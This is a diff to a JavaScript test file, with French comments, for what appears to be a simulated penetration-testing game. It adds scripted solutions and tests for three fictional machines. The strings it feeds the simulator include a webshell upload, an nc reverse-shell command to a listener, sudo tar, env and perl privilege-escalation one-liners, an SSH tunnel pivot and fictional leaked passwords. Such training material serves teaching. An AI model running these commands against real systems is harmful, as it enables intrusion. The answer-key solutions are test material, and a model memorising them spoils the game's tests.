@@ -183,6 +183,43 @@ const MACHINE_SOLUTIONS = {
     run(ctx, "C:\\Windows\\Temp\\svc.exe");
     return run(ctx, "type root.txt");
   },
+  stratus: (ctx) => {
+    run(ctx, "nmap 10.10.11.120");
+    run(ctx, "curl http://10.10.11.120/");
+    run(ctx, "cloudctl ls");
+    run(ctx, "cloudctl ls s3://stratus-prod-backups");
+    run(ctx, "cloudctl get s3://stratus-prod-backups/deploy.env");
+    run(ctx, "ssh dsomma@10.10.11.120");
+    pass(ctx, "Str4tus_D3ploy!23");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo env /bin/sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+  nexus: (ctx) => {
+    run(ctx, "exit"); // pour attraper une reverse shell, il faut être sur sa propre box
+    run(ctx, "nmap 10.10.11.135");
+    run(ctx, "curl http://10.10.11.135/");
+    run(ctx, "curl http://10.10.11.135/upload.php");
+    run(ctx, 'curl -F "file=@shell.php" http://10.10.11.135/upload.php');
+    run(ctx, "nc -lvnp 4444");
+    run(ctx, 'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"');
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+  citadel: (ctx) => {
+    // Pivot : nécessite NEXUS déjà rooté (fait plus tôt dans la boucle des machines).
+    run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");
+    run(ctx, "nmap 172.16.20.10");
+    run(ctx, "ssh dbadmin@172.16.20.10");
+    pass(ctx, "C1tad3l_Db#77");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo perl -e 'exec \"/bin/sh\";'");
+    return run(ctx, "cat /root/root.txt");
+  },
   axiom: (ctx) => {
     run(ctx, "nmap 10.10.11.244");
     run(ctx, "curl http://10.10.11.244:8080/");
@@ -202,7 +239,7 @@ section("Machines : recon -> accès -> privesc -> flags (les 8 machines)", () =>
   const ctx = freshContext();
   unlockAll(ctx);
   const machines = get(ctx, "MACHINES");
-  assertEqual(machines.length, 8, "8 machines définies dans MACHINES");
+  assertEqual(machines.length, 11, "11 machines définies dans MACHINES");
 
   let totalScoreCheck = 0;
   for (const m of machines) {
@@ -217,8 +254,8 @@ section("Machines : recon -> accès -> privesc -> flags (les 8 machines)", () =>
   }
 
   const finalScore = get(ctx, "GAME.score");
-  // 8 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 8 * 800 = 6400
-  assertEqual(finalScore, 6400, "score total cohérent après les 8 machines (100+150+250+100+200 par machine)");
+  // 11 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 11 * 800 = 8800
+  assertEqual(finalScore, 8800, "score total cohérent après les 11 machines (100+150+250+100+200 par machine)");
 
   const badges = get(ctx, "GAME.badges");
   assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 8 machines");
@@ -498,6 +535,80 @@ section("Reverse shell généralisé : altAccess réutilisable (PHANTOM)", () =>
   assertEqual(get(ctx, "SESSION.user"), "broland", "la reverse shell phantom atterrit sur le bon utilisateur");
   const flag = run(ctx, "cat user.txt");
   assert(/FLAG\{phantom_acces_initial/.test(flag.text), "le flag utilisateur phantom est accessible après le reverse shell");
+});
+
+// ── 12. Machine cloud (STRATUS) : bucket public via cloudctl ─────────────────
+section("Cloud mal configuré : cloudctl + bucket public (STRATUS)", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use stratus");
+  const ls = run(ctx, "cloudctl ls");
+  assert(/PUBLIC\s+s3:\/\/stratus-prod-backups/.test(ls.text), "cloudctl ls signale le bucket public");
+  const priv = run(ctx, "cloudctl ls s3://stratus-internal-keys");
+  assert(priv.cls === "t-err" && /AccessDenied/.test(priv.text), "un bucket privé refuse le listing (AccessDenied)");
+  const leak = run(ctx, "cloudctl get s3://stratus-prod-backups/deploy.env");
+  assert(/SSH_PASS=Str4tus_D3ploy!23/.test(leak.text), "cloudctl get lit le fichier du bucket public et fuite les creds");
+  const denied = run(ctx, "cloudctl get s3://stratus-internal-keys/id_rsa");
+  assert(denied.cls === "t-err", "cloudctl get refuse un objet d'un bucket privé");
+});
+
+// ── 13. Webshell upload (NEXUS) : curl -F + reverse shell gated par l'upload ──
+section("Upload de webshell : curl -F puis reverse shell (NEXUS)", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use nexus");
+  run(ctx, "nmap 10.10.11.135");
+
+  // Sans upload préalable, le webshell n'existe pas encore (404).
+  run(ctx, "nc -lvnp 4444");
+  const before = run(ctx, 'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"');
+  assert(before.cls === "t-err" && /404/.test(before.text), "sans upload, le chemin du webshell renvoie 404");
+  assertEqual(get(ctx, "GAME.progress.nexus.access"), false, "pas d'accès tant que le webshell n'est pas uploadé");
+
+  // Un fichier non autorisé est refusé, un .php déguisé passe.
+  const badFile = run(ctx, 'curl -F "file=@photo.jpg" http://10.10.11.135/upload.php');
+  assert(badFile.cls === "t-err", "un fichier non-php est refusé par le (faux) filtre");
+  const upload = run(ctx, 'curl -F "file=@shell.php" http://10.10.11.135/upload.php');
+  assert(upload.cls !== "t-err" && /uploads\/sh\.php/.test(upload.text), "l'upload d'un .php est accepté et révèle le chemin");
+
+  // Maintenant le webshell déclenche bien la reverse shell (écoute déjà active).
+  const shell = run(ctx, 'curl "http://10.10.11.135/uploads/sh.php?cmd=nc 10.10.14.1 4444 -e /bin/sh"');
+  assert(shell.cls !== "t-err", "après upload + écoute, le webshell ouvre la reverse shell");
+  assertEqual(get(ctx, "GAME.progress.nexus.access"), true, "accès www-data obtenu via le webshell");
+  assertEqual(get(ctx, "SESSION.user"), "www-data", "la reverse shell atterrit en www-data");
+  const flag = run(ctx, "cat user.txt");
+  assert(/FLAG\{nexus_acces_initial/.test(flag.text), "le flag utilisateur NEXUS est lisible après le webshell");
+});
+
+// ── 14. Pivot (CITADEL) : hôte interne joignable seulement via ssh -L ────────
+section("Pivot multi-hop : hôte interne via tunnel ssh -L (CITADEL)", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+
+  // Directement, l'hôte interne est injoignable.
+  const noRoute = run(ctx, "nmap 172.16.20.10");
+  assert(noRoute.cls === "t-err" && /interne/.test(noRoute.text), "l'hôte interne n'est pas routable directement");
+
+  // Le tunnel exige que le pivot (NEXUS) soit rooté.
+  const noPivot = run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");
+  assert(noPivot.cls === "t-err" && /root/.test(noPivot.text), "impossible d'ouvrir le tunnel tant que NEXUS n'est pas rooté");
+
+  // On roote NEXUS, puis le tunnel s'ouvre et l'hôte interne devient joignable.
+  run(ctx, "use nexus");
+  MACHINE_SOLUTIONS.nexus(ctx);
+  assertEqual(get(ctx, "GAME.progress.nexus.rootFlag"), true, "NEXUS rooté (prérequis du pivot)");
+  const tunnel = run(ctx, "ssh -L 9022:172.16.20.10:22 root@10.10.11.135");
+  assert(tunnel.cls !== "t-err" && /Tunnel SSH établi/.test(tunnel.text), "tunnel établi une fois NEXUS rooté");
+  const scan = run(ctx, "nmap 172.16.20.10");
+  assert(scan.cls !== "t-err" && /citadel/i.test(scan.text), "l'hôte interne est scannable à travers le tunnel");
+
+  // Accès + privesc complets sur l'hôte interne.
+  run(ctx, "ssh dbadmin@172.16.20.10");
+  pass(ctx, "C1tad3l_Db#77");
+  assertEqual(get(ctx, "SESSION.ctx"), "citadel", "accès obtenu sur l'hôte interne");
+  run(ctx, "sudo perl -e 'exec \"/bin/sh\";'");
+  const flag = run(ctx, "cat /root/root.txt");
+  assert(/FLAG\{citadel_root/.test(flag.text), "flag root CITADEL capturé après pivot + privesc");
 });
 
 // ── Rapport final ─────────────────────────────────────────────────────────────
